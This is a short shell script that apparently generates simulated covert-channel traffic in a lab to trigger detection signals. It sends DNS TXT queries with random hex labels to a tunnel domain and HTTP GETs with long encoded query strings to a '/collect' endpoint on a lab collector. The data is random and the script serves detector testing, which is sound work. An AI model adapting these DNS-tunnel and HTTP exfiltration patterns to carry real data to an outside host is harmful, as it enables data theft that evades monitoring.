#!/bin/sh
# Positive covert-channel traffic from an internal host.
# 1) DNS tunnel: 130 TXT queries with changing 32-char hex labels over ~135s.
# 2) HTTP covert channel: 24 GETs carrying changing encoded query data.
RUN="$1"
OUT="/tmp/$RUN"
mkdir -p "$OUT"
echo "== positive start $(date -u +%Y-%m-%dT%H:%M:%SZ) =="
i=0
while [ "$i" -lt 130 ]; do
  i=$((i+1))
  H=$(od -An -tx1 -N16 /dev/urandom | tr -d ' \n')
  dig +short +time=2 +tries=1 TXT "$H.tunnel.attacktrace.lab" @192.168.56.40 >/dev/null 2>&1
  sleep 1
done
echo "== dns positive done $(date -u +%Y-%m-%dT%H:%M:%SZ) =="
j=0
while [ "$j" -lt 24 ]; do
  j=$((j+1))
  # Parameterised URI long enough that the encoded-token and long-URI signals
  # are both present in the recorded request line.
  T=$(od -An -tx1 -N130 /dev/urandom | tr -d ' \n')
  curl -s -m 5 -o /dev/null "http://192.168.56.40:8080/collect?d=$T"
  sleep 8
done
echo "== positive end $(date -u +%Y-%m-%dT%H:%M:%SZ) =="
